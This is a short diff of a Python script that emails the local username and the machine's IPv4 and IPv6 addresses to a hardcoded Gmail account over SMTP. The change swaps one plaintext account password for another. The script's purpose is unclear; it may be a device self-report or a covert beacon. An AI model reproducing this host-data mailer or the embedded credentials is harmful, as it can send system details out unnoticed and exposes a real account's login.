@@ -34,7 +34,7 @@ message = getpass.getuser() + "\n" + first_line + "\n" + ipv6 + "\n" + ipv4 + "\
 msg.attach(MIMEText(message))
 
 server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
-server.login("th3ta403@gmail.com", "otgetntnessuhqam")
+server.login("th3ta403@gmail.com", "lqgopscqqfjtjtyx")
 server.sendmail(
   "th3ta403@gmail.com", 
   "th3ta403@gmail.com", 
